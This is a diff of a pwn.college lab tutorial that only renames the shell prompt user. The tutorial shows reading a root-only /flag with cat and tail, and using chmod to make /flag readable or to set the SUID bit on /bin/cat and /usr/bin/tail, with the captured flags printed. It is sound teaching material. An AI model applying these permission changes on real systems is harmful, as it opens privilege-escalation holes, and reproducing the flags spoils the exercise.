@@ -30,9 +30,9 @@ Later programs will be more tricky.
 Thus, after launching an instance with `/bin/cat` as the chosen file, retrieving the flag with it is quite simple:
 
 ```
-cse466@b38bdd753b5b:~$ cat /flag
+hacker@b38bdd753b5b:~$ cat /flag
 pwn_college{747985b99bd25b8805ced639297720ae71e87a7acef580dc6b514143e5152133}
-cse466@b38bdd753b5b:~$ exit
+hacker@b38bdd753b5b:~$ exit
 ```
 
 As you can see, this gives you the flag associated with `cat`.
@@ -42,9 +42,9 @@ Since the `/flag` file only has one line (the flag), this is perfect for us!
 Specifying `/usr/bin/tail`, you will receive another flag:
 
 ```
-cse466@b38bdd753b5b:~$ tail /flag
+hacker@b38bdd753b5b:~$ tail /flag
 pwn_college{7ca9d3c2fcbaa0c0cde22777bfefff2a5f5ac707f5194f91cd24226dbae0b74b}
-cse466@b38bdd753b5b:~$ exit
+hacker@b38bdd753b5b:~$ exit
 ```
 
 Now, you have two flags: one for `cat` and one for `tail`.
@@ -58,28 +58,28 @@ We'll cover a few here (feel free to use this for one of your solutions!).
 First, we can simply change the permissions of the `/flag` file to allow us to read it:
 
 ```
-cse466@5d1f52fff4e8:~$ chmod 644 /flag
-cse466@5d1f52fff4e8:~$ cat /flag
+hacker@5d1f52fff4e8:~$ chmod 644 /flag
+hacker@5d1f52fff4e8:~$ cat /flag
 pwn_college{36ef1e24753a8e3119eeac953e44f47f48aa388f9a72e2cb2d54fc9a622c5ef8}
-cse466@5d1f52fff4e8:~$ exit
+hacker@5d1f52fff4e8:~$ exit
 ```
 
 Second, we can make the `/bin/cat` binary SUID, so that _it_ runs as root and lets us read the flag.
 
 ```
-cse466@5d1f52fff4e8:~$ chmod 4755 /bin/cat
-cse466@5d1f52fff4e8:~$ cat /flag
+hacker@5d1f52fff4e8:~$ chmod 4755 /bin/cat
+hacker@5d1f52fff4e8:~$ cat /flag
 pwn_college{36ef1e24753a8e3119eeac953e44f47f48aa388f9a72e2cb2d54fc9a622c5ef8}
-cse466@5d1f52fff4e8:~$ exit
+hacker@5d1f52fff4e8:~$ exit
 ```
 
 And we can do the same with other binaries, such as `/usr/bin/tail`:
 
 ```
-cse466@5d1f52fff4e8:~$ chmod 4755 /usr/bin/tail
-cse466@5d1f52fff4e8:~$ cat /flag
+hacker@5d1f52fff4e8:~$ chmod 4755 /usr/bin/tail
+hacker@5d1f52fff4e8:~$ cat /flag
 pwn_college{36ef1e24753a8e3119eeac953e44f47f48aa388f9a72e2cb2d54fc9a622c5ef8}
-cse466@5d1f52fff4e8:~$ exit
+hacker@5d1f52fff4e8:~$ exit
 ```
 
 Note that all three ways of getting the flag after specifying `chmod` _get the same flag_.
